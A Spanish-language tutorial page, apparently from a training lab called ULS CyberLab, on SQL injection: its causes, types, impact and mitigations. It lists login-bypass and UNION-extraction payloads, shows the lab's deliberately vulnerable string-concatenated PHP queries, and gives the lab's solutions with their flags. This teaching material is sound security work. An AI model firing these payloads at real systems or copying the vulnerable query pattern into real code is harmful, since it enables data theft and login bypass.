---
title: SQL Injection
description: Teoría completa sobre SQL Injection - Marco Teórico ULS CyberLab
sidebar:
  order: 11
---

# SQL Injection (SQLi)

## ¿Qué es SQL Injection?

**SQL Injection** (Inyección SQL) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Se produce cuando la entrada del usuario se **incluye directamente en una consulta SQL** sin ser sanitizada o validada correctamente.

Es consistentemente la vulnerabilidad #1 o #2 en el **OWASP Top 10** y una de las más antiguas y peligrosas de la web.

```
Aplicación normal:
  Usuario ingresa: admin
  Query ejecutada: SELECT * FROM users WHERE username = 'admin'
                                                              ✅ Normal

Aplicación con SQLi:
  Usuario ingresa: ' OR '1'='1
  Query ejecutada: SELECT * FROM users WHERE username = '' OR '1'='1'
                                                              ⚠️ Siempre verdadero!
```

---

## ¿Por qué Ocurre?

La causa raíz es la **concatenación de strings** en la construcción de queries:

```php
// ❌ CÓDIGO VULNERABLE - Lo que hace ULS CyberLab en el login
$username = $_POST['username'];  // Sin sanitizar
$password = $_POST['password'];  // Sin sanitizar

$query = "SELECT id, username, role 
          FROM users 
          WHERE username = '$username' AND password = '$password'";

$result = $conn->query($query);
```

Cuando el atacante ingresa `' OR '1'='1` como usuario, la query se convierte en:
```sql
SELECT id, username, role 
FROM users 
WHERE username = '' OR '1'='1' AND password = 'cualquier_cosa'
```

Como `'1'='1'` siempre es verdadero, la query devuelve el primer usuario de la tabla (normalmente `admin`).

---

## Tipos de SQL Injection

### 1. In-Band SQLi (La más común)

#### Error-Based SQLi
Usa mensajes de error de la base de datos para extraer información.

```sql
-- El error revela la estructura de la DB
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --

-- Mensaje de error obtenido:
-- XPATH syntax error: '~8.0.33-MariaDB'
```

#### UNION-Based SQLi
Usa la cláusula `UNION` para agregar resultados adicionales de otras tablas.

```sql
-- En ULS CyberLab (módulo sqli.php, parámetro ?search=)
' UNION SELECT 1, secret_name FROM secrets WHERE '1'='1

-- Esto extrae datos de la tabla 'secrets', incluyendo la flag:
-- FLAG{UN10N_S3L3CT_PR0}
```

### 2. Blind SQLi

La aplicación no muestra errores ni resultados directos, pero el comportamiento cambia según la query.

#### Boolean-Based Blind
```sql
-- Si es verdadero, la página carga normal
' AND 1=1 --

-- Si es falso, la página cambia o no muestra resultados
' AND 1=2 --

-- Esto permite extraer datos carácter por carácter
' AND SUBSTRING(username,1,1)='a' --
```

#### Time-Based Blind
```sql
-- Si la condición es verdadera, el servidor espera 5 segundos
' AND SLEEP(5) --

-- Si no hay delay, la condición es falsa
' AND IF(1=2, SLEEP(5), 0) --
```

### 3. Out-of-Band SQLi
Usa canales de comunicación externos (DNS, HTTP) para extraer datos. Menos común, requiere configuración específica del servidor.

---

## Impacto de SQL Injection

| Nivel | Consecuencia |
|-------|-------------|
| **Bajo** | Ver datos que no deberías ver |
| **Medio** | Extraer base de datos completa |
| **Alto** | Bypassear autenticación, modificar datos |
| **Crítico** | Ejecución de comandos del SO (via `xp_cmdshell` en MSSQL, `LOAD_FILE/INTO OUTFILE` en MySQL) |

En ULS CyberLab se simula el nivel **Alto**: bypass de login y extracción de datos confidenciales.

---

## Payloads Comunes

### Bypass de Login

```sql
-- Usuario y password como admin sin conocer la contraseña
admin'--
admin'#
' OR 1=1--
' OR '1'='1
" OR "1"="1
') OR ('1'='1
' OR 1=1 LIMIT 1--
```

### Comentarios SQL por Motor

| Motor | Comentario |
|-------|-----------|
| MySQL | `--` o `#` o `/* */` |
| MSSQL | `--` o `/* */` |
| Oracle | `--` o `/* */` |
| SQLite | `--` o `/* */` |

### UNION SELECT para Extracción

```sql
-- Primero determinar número de columnas
' ORDER BY 1--   ← Si no falla, hay al menos 1 columna
' ORDER BY 2--   ← Si no falla, hay al menos 2 columnas
' ORDER BY 3--   ← Si falla, hay 2 columnas

-- Luego hacer el UNION
' UNION SELECT 1,2--
' UNION SELECT null,null--

-- Extraer datos
' UNION SELECT 1,database()--          ← Nombre de la DB
' UNION SELECT 1,user()--              ← Usuario de MySQL
' UNION SELECT 1,version()--           ← Versión de MySQL
' UNION SELECT 1,table_name FROM information_schema.tables--
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,password FROM users LIMIT 1--
```

---

## En ULS CyberLab

### Lab 1 — Login Bypass (10 puntos)

**Archivo vulnerable:** `index.php`

```php
// Línea vulnerable
$query = "SELECT id, username, role FROM users 
          WHERE username = '$username' AND password = '$password'";
```

**Payload:**
```
Username: ' OR '1'='1
Password: cualquier_cosa
```

**Resultado:** Login exitoso como `admin` + `FLAG{SQL_1NJ3CT10N_M4ST3R}` capturada automáticamente.

### Lab 2 — UNION SELECT (20 puntos)

**Archivo vulnerable:** `modules/sqli.php`

```php
// Línea vulnerable
$query = "SELECT id, secret_name FROM secrets 
          WHERE secret_name LIKE '%$search%'";
```

**Payload:**
```
?search=' UNION SELECT 1,secret_name FROM secrets WHERE '1'='1
```

**Resultado:** La tabla `secrets` revela `FLAG{UN10N_S3L3CT_PR0}`.

---

## Mitigación

### ✅ Prepared Statements (La solución correcta)

```php
// Código seguro con prepared statements
$stmt = $conn->prepare(
    "SELECT id, username, role FROM users 
     WHERE username = ? AND password = ?"
);
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

Los prepared statements **separan el código SQL de los datos**, haciendo imposible la inyección.

### ✅ Stored Procedures

```sql
DELIMITER //
CREATE PROCEDURE login_user(IN p_username VARCHAR(50), IN p_password VARCHAR(255))
BEGIN
    SELECT id, username, role FROM users 
    WHERE username = p_username AND password = p_password;
END //
```

### ✅ Validación y Sanitización

```php
// Validar tipo y formato
if (!preg_match('/^[a-zA-Z0-9_]{3,50}$/', $username)) {
    die("Usuario inválido");
}

// Escapar caracteres especiales (NO suficiente solo con esto)
$username = $conn->real_escape_string($username);
```

### ✅ Principio de Mínimo Privilegio

```sql
-- Crear usuario DB con solo los permisos necesarios
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT ON uls_cyberlab.users TO 'app_user'@'localhost';
-- NO: GRANT ALL PRIVILEGES
```

### ✅ WAF (Web Application Firewall)

Un WAF detecta y bloquea payloads SQLi conocidos antes de que lleguen a la aplicación. Opciones: ModSecurity, Cloudflare WAF, AWS WAF.

---

## Lecturas Complementarias

- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection) — Labs gratuitos muy detallados
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
